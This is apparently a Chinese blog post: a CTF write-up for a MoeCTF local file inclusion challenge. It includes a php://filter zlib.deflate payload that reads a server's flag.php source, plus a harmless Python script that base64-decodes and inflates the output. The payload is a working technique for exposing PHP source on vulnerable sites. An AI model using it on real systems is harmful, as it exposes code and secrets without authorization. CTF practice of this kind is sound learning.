---
title: "七狗免费小说：php://filter LFI 解题记录"
date: 2026-11-05 20:24:00
tags: [CTF, LFI, "php://filter", MoeCTF, Python]
categories: [CTF]
cover: /images/qigou-lfi/image4.png
description: "从 URL 参数到 php://filter 伪协议读取源码，再用 Python 解 base64 + 裸 deflate 拿到 flag。"
---

> 一道 LFI（本地文件包含）题目的完整记录：怎么发现参数、怎么读后端源码、怎么把压缩过的回显还原成明文。本文为 CTF 竞赛题解，仅限授权环境练习。

## 一、观察 URL 细节

打开后直接点 **flag 篇**，这里注意到 URL 细节：

![题目页面的 URL 参数](/images/qigou-lfi/image1.png)

正常 URL 一般不带参数，带了 `?file=` 之类的参数就值得多看一眼。

## 二、F12 看源码

按照提示 F12 找到重点：

![F12 查看页面源码](/images/qigou-lfi/image2.png)

![源码中的关键逻辑](/images/qigou-lfi/image3.png)

这里不一一列举，反正看源代码可以看到后端逻辑。这里用 AI 这里出了后端代码：

![还原出的后端代码](/images/qigou-lfi/image4.png)

## 三、用 php://filter 读源码

直接在 URL 里改参数，使用没有拦截的 `php://filter` 伪协议，与压缩过滤器 `zlib.deflate` / `bzip2.compress`。

Payload：

```text
?file=php://filter/zlib.deflate/resource=flag.php
```

出来经过 base64 编码的**裸 deflate 流**（我不会解码，直接 AI 了）。

## 四、配套解码脚本 lfi_decode.py

回显不能直接看，得先 base64 解码、再 zlib 解压，才能拿到 PHP 源码明文和 flag。下面这个脚本只用 Python 标准库，不用装任何依赖。

- [下载 lfi_decode.py](/downloads/lfi_decode.py)

```python
# -*- coding: utf-8 -*-
"""
===== LFI 解码脚本（CTF 用，可在 VS Code 里直接运行）=====

这个脚本帮你把 CTF 题目回显的那串 base64，还原成 PHP 源码、并找出 flag。
原理分两步：
    第①步：base64 解码  → 得到「压缩过的二进制数据」（不是文字，直接看是乱码）
    第②步：zlib 解压    → 把压缩数据还原成「UTF-8 明文源码」（这里才有 flag）

注意：本脚本只用 Python 自带的功能，不用 pip 安装任何东西。
"""

import base64
import zlib
import re

# ============================================================
# 把你的 base64 整段粘到下面这一行引号里（替换掉示例内容）
# 示例：B64 = "s7EvyCjgUknLSUy3VcrNT00uSat2cfX1j4+IjIo3NDKuVbLmsrcDAA=="
# ============================================================
B64 = "lZDRToJgHMXveYpvrlumgwm1CO96DyHINpsuu6q1RWRGplRzRQ5XuhK1JdbWcgj1Mt//4+vKVwjeoC7O1fmf8//tSIVqqcqs6OXiNtpAmd2Kpu7rhyKvaHmB01lOVFfZnJDj2OIaJ7I8r+T5LT0nqJp4lFlnNLVUQZnNNAyzN3BHeH7x0xssw0uwJ8S1qDEhTjvunuIgIFaLmlHsNqlnSMqeDNYYz5uJB5ZHzPoyfIAnjwxPiONLNZkOXmBmw/kCrkzStnBwJmVrMo5celwH45M0bsh7n3S+EohsFtHvezL9ILcNeL1Lv0Vu3BmlCI5PvSHY1+igvKMgaDfjcJzQ4egRbB8vnvG8FU/7MDWXYTctSsb4i/5zWpCZXw=="
# ============================================================


def main():
    # 去掉可能混进来的换行、空格，只保留纯 base64 字符
    b64 = "".join(B64.split())

    # 第①步：base64 解码
    data = base64.b64decode(b64)
    print("① base64 解码成功，得到 %d 字节（这是压缩数据，直接看是乱码，正常）" % len(data))

    # 第②步：zlib 解压（参数 -15 表示「裸 deflate」，因为 PHP 的 zlib.deflate 不带 zlib 头）
    text = zlib.decompress(data, -15).decode("utf-8", "replace")
    print("② 解压成功，得到源码明文：\n")
    print(text)

    # 从源码里找出 flag
    m = re.search(r"moectf\{[^}]+\}", text)
    if m:
        print("\n🚩 找到 flag：" + m.group(0))
    else:
        print("\n（没找到 moectf{...}：可能这不是 flag.php 的源码，或你复制的 base64 不完整）")


if __name__ == "__main__":
    main()
```

### 两个关键点

| 步骤 | 说明 |
| --- | --- |
| `base64.b64decode()` | 题目回显是 base64，先还原成二进制 |
| `zlib.decompress(data, -15)` | `-15` 表示**裸 deflate**。PHP 的 `zlib.deflate` 过滤器输出不带 zlib 头，用默认参数会报错 |
| `re.search(r"moectf\{[^}]+\}", text)` | 从还原出的源码里直接抓 flag |

把 `B64` 换成你自己题目回显的那串，直接 `python lfi_decode.py` 就能跑。

---

回过头看，这题的链条其实很清晰：**参数可控 → 伪协议读文件 → 压缩过滤器绕过直接输出 → 本地解压还原源码**。难点不在 payload，而在认出那串乱码是「被压缩过的数据」。
